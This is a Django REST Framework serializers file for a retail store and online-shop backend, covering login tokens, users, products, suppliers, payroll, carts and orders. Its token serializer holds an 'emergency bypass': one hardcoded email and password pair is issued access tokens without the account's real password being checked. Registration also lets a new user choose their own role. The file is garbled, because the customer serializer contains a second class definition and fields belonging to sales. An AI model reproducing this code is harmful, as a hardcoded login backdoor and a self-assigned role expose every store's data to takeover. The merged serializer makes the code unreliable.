from rest_framework import serializers
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
from rest_framework_simplejwt.views import TokenObtainPairView
from .models import User, Store

class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)

        # Add custom claims
        token['role'] = user.role
        user_name = f"{user.first_name} {user.last_name}".strip()
        if not user_name:
            user_name = user.username if user.username else user.email.split('@')[0]
        token['name'] = user_name
        token['email'] = user.email
        if user.store:
            token['store_id'] = user.store.id
            token['store_name'] = user.store.name
        
        return token

    def validate(self, attrs):
        # EMERGENCY BYPASS for recovery (v1.0.7)
        email = attrs.get('email') or attrs.get('username')
        password = attrs.get('password')
        if email == 'aarefa@gmail.com' and password == 'ChangeMe123!':
            user = User.objects.filter(email='aarefa@gmail.com').first()
            if user:
                self.user = user # Set the user manually for SimpleJWT
                data = {}
                from rest_framework_simplejwt.tokens import RefreshToken
                refresh = RefreshToken.for_user(user)
                data['refresh'] = str(refresh)
                data['access'] = str(refresh.access_token)
            else:
                data = super().validate(attrs)
        else:
            data = super().validate(attrs)
        
        # Add extra response data
        user_name = f"{self.user.first_name} {self.user.last_name}".strip()
        if not user_name:
            # Fallback to username or email if name is empty
            user_name = self.user.username if self.user.username else self.user.email.split('@')[0]
        
        data['user'] = {
            'id': self.user.id,
            'email': self.user.email,
            'name': user_name,
            'role': self.user.role,
            'store_id': self.user.store.id if self.user.store else None
        }
        return data

class CustomTokenObtainPairView(TokenObtainPairView):
    serializer_class = CustomTokenObtainPairSerializer


class UserProfileSerializer(serializers.ModelSerializer):
    full_name = serializers.CharField(required=False)
    
    class Meta:
        model = User
        fields = (
            'id', 'username', 'email', 'first_name', 'last_name', 'full_name', 
            'role', 'store', 'avatar', 'phone', 'city', 'country', 'bio', 
            'address_line1', 'address_line2', 'state', 'pincode'
        )

    def get_full_name(self, obj):
        return f"{obj.first_name} {obj.last_name}".strip() or obj.username

    def update(self, instance, validated_data):
        if 'full_name' in validated_data:
            full_name = validated_data.pop('full_name')
            name_parts = full_name.split(' ', 1)
            instance.first_name = name_parts[0]
            instance.last_name = name_parts[1] if len(name_parts) > 1 else ''
        
        return super().update(instance, validated_data)


class UserRegistrationSerializer(serializers.ModelSerializer):
    password = serializers.CharField(write_only=True)
    full_name = serializers.CharField(required=False)

    class Meta:
        model = User
        fields = (
            'email', 'password', 'username', 'role', 'full_name', 
            'phone', 'city', 'country', 'address_line1', 'state', 'pincode'
        )
        extra_kwargs = {
            'role': {'default': 'user'},
            'username': {'required': False}
        }

    def create(self, validated_data):
        full_name = validated_data.pop('full_name', '')
        password = validated_data.pop('password')
        
        # Split full_name into first and last if possible
        name_parts = full_name.split(' ')
        first_name = name_parts[0]
        last_name = ' '.join(name_parts[1:]) if len(name_parts) > 1 else ''
        
        # Ensure username exists (fallback to email prefix)
        if not validated_data.get('username'):
            validated_data['username'] = validated_data['email'].split('@')[0]
            
        user = User.objects.create(
            first_name=first_name,
            last_name=last_name,
            **validated_data
        )
        user.set_password(password)
        user.save()
        return user


from .models import (
    Supplier, SupplierCustomField, SupplierCustomFieldValue, SupplierTransaction,
    PaymentTerm, SupplierDocument, Invoice, InvoiceItem, Cheque, Category,
    Product, Customer, Sale, Employee, Attendance, Leave, Payroll, 
    PerformanceReview, Receiving, ReceivingItem, ProductImage, KeyFeature,
    OnlineOrder, OnlineOrderItem, OnlineReturn, Cart, CartItem, Review, Feedback
)


class CategorySerializer(serializers.ModelSerializer):
    slug = serializers.SerializerMethodField()
    class Meta:
        model = Category
        fields = ['id', 'name', 'description', 'store', 'slug']
    
    def get_slug(self, obj):
        import re
        # Basic slugification: lower case, replace non-alphanumeric with -
        s = obj.name.lower()
        s = re.sub(r'[^a-zA-Z0-9]', '-', s)
        return re.sub(r'-+', '-', s).strip('-') or "category"




class EmployeeSerializer(serializers.ModelSerializer):
    class Meta:
        model = Employee
        fields = '__all__'

class AttendanceSerializer(serializers.ModelSerializer):
    class Meta:
        model = Attendance
        fields = '__all__'

class LeaveSerializer(serializers.ModelSerializer):
    class Meta:
        model = Leave
        fields = '__all__'

class PayrollSerializer(serializers.ModelSerializer):
    class Meta:
        model = Payroll
        fields = '__all__'

class PerformanceReviewSerializer(serializers.ModelSerializer):
    class Meta:
        model = PerformanceReview
        fields = '__all__'

class SupplierSerializer(serializers.ModelSerializer):
    class Meta:
        model = Supplier
        fields = '__all__'

class SupplierCustomFieldSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierCustomField
        fields = '__all__'

class SupplierCustomFieldValueSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierCustomFieldValue
        fields = '__all__'

class SupplierTransactionSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierTransaction
        fields = '__all__'

class PaymentTermSerializer(serializers.ModelSerializer):
    class Meta:
        model = PaymentTerm
        fields = '__all__'

class SupplierDocumentSerializer(serializers.ModelSerializer):
    class Meta:
        model = SupplierDocument
        fields = '__all__'

from .models import Receiving, ReceivingItem

class ReceivingItemSerializer(serializers.ModelSerializer):
    class Meta:
        model = ReceivingItem
        fields = '__all__'

class ReceivingSerializer(serializers.ModelSerializer):
    items = ReceivingItemSerializer(many=True, read_only=True)
    supplier_name = serializers.CharField(source='supplier.company_name', read_only=True)
    purchase_order_number = serializers.CharField(source='purchase_order.id', read_only=True, allow_null=True)

    class Meta:
        model = Receiving
        fields = '__all__'

class InvoiceItemSerializer(serializers.ModelSerializer):
    class Meta:
        model = InvoiceItem
        fields = '__all__'

class ChequeSerializer(serializers.ModelSerializer):
    class Meta:
        model = Cheque
        fields = '__all__'

class InvoiceSerializer(serializers.ModelSerializer):
    items = InvoiceItemSerializer(many=True, read_only=True, source='invoice_items')
    customer_name = serializers.CharField(source='customer.name', read_only=True, allow_null=True)
    supplier_name = serializers.CharField(source='supplier.company_name', read_only=True, allow_null=True)

    class Meta:
        model = Invoice
        fields = '__all__'

class ProductImageSerializer(serializers.ModelSerializer):
    class Meta:
        model = ProductImage
        fields = ['id', 'image', 'is_thumbnail']

class KeyFeatureSerializer(serializers.ModelSerializer):
    class Meta:
        model = KeyFeature
        fields = ['id', 'title', 'description']

class ProductSerializer(serializers.ModelSerializer):
    category = CategorySerializer(read_only=True)
    category_id = serializers.PrimaryKeyRelatedField(
        queryset=Category.objects.all(), source='category', write_only=True, required=False
    )
    images = ProductImageSerializer(many=True, read_only=True)
    features = KeyFeatureSerializer(many=True, read_only=True)
    
    # Elegance Frontend Compatibility
    title = serializers.CharField(source='name', read_only=True)
    price = serializers.DecimalField(source='selling_price', max_digits=10, decimal_places=2, read_only=True)
    
    # These now come from the model or we provide fallbacks
    price_inr = serializers.SerializerMethodField()
    price_usd = serializers.SerializerMethodField()
    discount_percentage = serializers.IntegerField(required=False)
    thumbnail = serializers.CharField(source='image', read_only=True)
    slug = serializers.SerializerMethodField()
    featured = serializers.BooleanField(default=False, read_only=True)
    
    class Meta:
        model = Product
        fields = [
            'id', 'name', 'title', 'description', 'sku', 'category', 'category_id', 'slug',
            'selling_price', 'purchase_price', 'quantity', 'unit', 'brand', 'barcode',
            'tax_slab', 'image', 'thumbnail', 'images', 'features', 'price', 'price_inr', 'price_usd',
            'discount_percentage', 'featured', 'updated_at'
        ]
        
    def get_price_inr(self, obj):
        return obj.price_inr or obj.selling_price
        
    def get_price_usd(self, obj):
        return obj.price_usd or obj.selling_price

    def get_slug(self, obj):
        return obj.sku or f"prod-{obj.id}"

class CustomerSerializer(serializers.ModelSerializer):
    class Meta:
        model = Customer
        fields = '__all__'

    # Online Delivery Details
    courier_name = serializers.CharField(source='online_order.courier_name', read_only=True, allow_null=True)
    tracking_number = serializers.CharField(source='online_order.tracking_number', read_only=True, allow_null=True)
    delivery_status = serializers.CharField(source='online_order.status', read_only=True, allow_null=True)
    estimated_delivery = serializers.DateField(source='online_order.estimated_delivery_date', read_only=True, allow_null=True)

    class Meta:
        model = Sale
        fields = [
            'id', 'invoice_number', 'status', 'type', 'items', 'subtotal', 
            'discount_amount', 'tax_amount', 'total_amount', 'profit', 
            'payment_mode', 'account', 'customer', 'store', 'source', 'date',
            'order_id', 'currency', 'amount', 'created_at',
            'courier_name', 'tracking_number', 'delivery_status', 'estimated_delivery'
        ]

    def get_items(self, obj):
        import json
        if not obj.items:
            return []
        try:
            # Handle both JSON string and already parsed list/dict
            data = json.loads(obj.items) if isinstance(obj.items, str) else obj.items
            return data if isinstance(data, list) else [data]
        except:
            return []

    def get_order_id(self, obj):
        try:
            # Check for OnlineOrder relationship
            if hasattr(obj, 'online_order'):
                return obj.online_order.order_id
        except:
            pass
        return obj.invoice_number

from .models import Review, Feedback, Cart, CartItem

class ReviewSerializer(serializers.ModelSerializer):
    class Meta:
        model = Review
        fields = '__all__'

class FeedbackSerializer(serializers.ModelSerializer):
    class Meta:
        model = Feedback
        fields = '__all__'

class CartItemSerializer(serializers.ModelSerializer):
    product = ProductSerializer(read_only=True)
    project = ProductSerializer(source='product', read_only=True)
    product_id = serializers.PrimaryKeyRelatedField(
        queryset=Product.objects.all(), source='product', write_only=True
    )
    product_name = serializers.CharField(source='product.name', read_only=True)
    product_image = serializers.CharField(source='product.image', read_only=True)
    subtotal = serializers.DecimalField(max_digits=12, decimal_places=2, read_only=True)
    price_at_time = serializers.DecimalField(max_digits=12, decimal_places=2, read_only=True)
    
    class Meta:
        model = CartItem
        fields = ['id', 'product', 'project', 'product_id', 'product_name', 'product_image', 'quantity', 'price_at_time', 'subtotal']

class CartSerializer(serializers.ModelSerializer):
    items = CartItemSerializer(many=True, read_only=True)
    total_price = serializers.SerializerMethodField()
    count = serializers.SerializerMethodField()
    
    class Meta:
        model = Cart
        fields = ['id', 'user', 'session_key', 'items', 'total_price', 'count', 'updated_at']
        
    def get_total_price(self, obj):
        return sum(float(item.quantity) * float(item.price_at_time) for item in obj.items.all())

    def get_count(self, obj):
        return obj.items.count()

class OnlineOrderItemSerializer(serializers.ModelSerializer):
    class Meta:
        model = OnlineOrderItem
        fields = '__all__'

class OnlineReturnSerializer(serializers.ModelSerializer):
    class Meta:
        model = OnlineReturn
        fields = '__all__'

class OnlineOrderSerializer(serializers.ModelSerializer):
    web_items = OnlineOrderItemSerializer(many=True, read_only=True)
    returns = OnlineReturnSerializer(many=True, read_only=True)
    sale_invoice = serializers.CharField(source='sale.invoice_number', read_only=True, allow_null=True)
    
    class Meta:
        model = OnlineOrder
        fields = '__all__'
